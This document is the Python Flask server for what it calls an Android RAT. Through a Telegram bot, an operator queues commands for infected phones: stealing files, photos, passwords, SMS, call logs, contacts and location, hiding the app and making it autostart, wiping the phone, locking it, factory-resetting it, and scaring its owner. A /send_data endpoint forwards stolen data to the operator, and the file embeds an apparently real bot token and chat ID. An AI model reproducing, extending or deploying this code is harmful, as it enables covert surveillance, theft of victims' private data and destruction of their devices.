import os
import time
import threading
import requests
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = '7798641801:AAHZWpVGv2YicowZaigNS9Q7jIHu9S3Jxaw'
CHAT_ID = '7803661441'

latest_command = {"cmd": "none", "params": ""}

print("✅ RAT сервер запущен", flush=True)

# ========== ОТПРАВКА СООБЩЕНИЙ ==========
def send_tg(text, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text}
        if keyboard:
            data['reply_markup'] = json.dumps(keyboard)
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ========== КНОПКИ ==========
def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🕵️‍♂️ КРАЖА", "callback_data": "menu_steal"}],
            [{"text": "⚙️ СКРЫТНОСТЬ", "callback_data": "menu_stealth"}],
            [{"text": "💀 УНИЧТОЖЕНИЕ", "callback_data": "menu_kill"}],
            [{"text": "👻 УСТРАШЕНИЕ", "callback_data": "menu_scare"}],
            [{"text": "📱 ИНФО", "callback_data": "info"}]
        ]
    }

def steal_menu():
    return {
        "inline_keyboard": [
            [{"text": "📁 ФАЙЛЫ", "callback_data": "steal_files"}, {"text": "📸 ГАЛЕРЕЯ", "callback_data": "steal_gallery"}],
            [{"text": "🔑 ПАРОЛИ", "callback_data": "steal_passwords"}, {"text": "📝 ЗАМЕТКИ", "callback_data": "steal_notes"}],
            [{"text": "💬 СМС", "callback_data": "steal_sms"}, {"text": "📞 ЗВОНКИ", "callback_data": "steal_calls"}],
            [{"text": "👥 КОНТАКТЫ", "callback_data": "steal_contacts"}, {"text": "📍 ЛОКАЦИЯ", "callback_data": "steal_location"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def stealth_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎭 МАСКИРОВКА", "callback_data": "mask_app"}],
            [{"text": "📦 СОЗДАТЬ КОПИЮ", "callback_data": "copy_apk"}],
            [{"text": "👁️ СКРЫТЬ ИКОНКУ", "callback_data": "hide_icon"}],
            [{"text": "🔄 АВТОЗАПУСК", "callback_data": "auto_start"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def kill_menu():
    return {
        "inline_keyboard": [
            [{"text": "💀 УДАЛИТЬ ВСЁ", "callback_data": "wipe_data"}],
            [{"text": "🔒 ЗАБЛОКИРОВАТЬ", "callback_data": "lock_phone"}],
            [{"text": "📱 СБРОС ДО ЗАВОДСКИХ", "callback_data": "factory_reset"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def scare_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔊 СТРАШНЫЙ ЗВУК", "callback_data": "scare_sound"}],
            [{"text": "🪟 20 ОКОН", "callback_data": "scare_windows"}],
            [{"text": "💀 ФЕЙК УДАЛЕНИЕ", "callback_data": "scare_delete"}],
            [{"text": "👻 ДЖАМПСКЕЙР", "callback_data": "scare_jump"}],
            [{"text": "💬 СПАМ", "callback_data": "scare_spam"}],
            [{"text": "🎵 RICKROLL", "callback_data": "scare_rick"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

# ========== ОБРАБОТЧИКИ ==========
def handle_callback(data):
    global latest_command
    
    if data == "back_main":
        send_tg("🤖 ГЛАВНОЕ МЕНЮ", main_menu())
    
    elif data == "menu_steal":
        send_tg("🕵️‍♂️ КРАЖА ДАННЫХ", steal_menu())
    elif data == "menu_stealth":
        send_tg("⚙️ СКРЫТНОСТЬ", stealth_menu())
    elif data == "menu_kill":
        send_tg("💀 УНИЧТОЖЕНИЕ", kill_menu())
    elif data == "menu_scare":
        send_tg("👻 УСТРАШЕНИЕ", scare_menu())
    
    elif data == "info":
        send_tg("📱 РАБОТАЕТ\nКоманды отправлены", main_menu())
    
    # КРАЖА
    for cmd in ["steal_files", "steal_gallery", "steal_passwords", "steal_notes", "steal_sms", "steal_calls", "steal_contacts", "steal_location"]:
        if data == cmd:
            latest_command = {"cmd": cmd, "params": ""}
            send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    
    # СКРЫТНОСТЬ
    for cmd in ["mask_app", "copy_apk", "hide_icon", "auto_start"]:
        if data == cmd:
            latest_command = {"cmd": cmd, "params": ""}
            send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    
    # УНИЧТОЖЕНИЕ
    for cmd in ["wipe_data", "lock_phone", "factory_reset"]:
        if data == cmd:
            latest_command = {"cmd": cmd, "params": ""}
            send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    
    # УСТРАШЕНИЕ
    for cmd in ["scare_sound", "scare_windows", "scare_delete", "scare_jump", "scare_spam", "scare_rick"]:
        if data == cmd:
            latest_command = {"cmd": cmd, "params": ""}
            send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())

# ========== СЛУШАТЕЛЬ ==========
def listen():
    last_id = 0
    send_tg("🤖 ANDROID RAT АКТИВИРОВАН\nВыберите действие:", main_menu())
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': last_id + 1, 'timeout': 10}
            r = requests.get(url, params=params, timeout=15).json()
            if r.get('ok'):
                for update in r['result']:
                    last_id = update['update_id']
                    if 'callback_query' in update:
                        handle_callback(update['callback_query']['data'])
                    elif 'message' in update:
                        text = update['message'].get('text', '')
                        if text == '/start':
                            send_tg("🤖 RAT АКТИВИРОВАН\nВыберите действие:", main_menu())
        except Exception as e:
            print(f"Ошибка: {e}", flush=True)
        time.sleep(1)

threading.Thread(target=listen, daemon=True).start()

# ========== API ==========
@app.route('/')
def home():
    return "✅ RAT сервер работает!", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    params = latest_command["params"]
    if cmd != "none":
        latest_command["cmd"] = "none"
        latest_command["params"] = ""
    return jsonify({"command": cmd, "params": params})

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data:
        send_tg(f"📱 {data.get('type', 'data')}:\n{data.get('content', '')[:3000]}")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
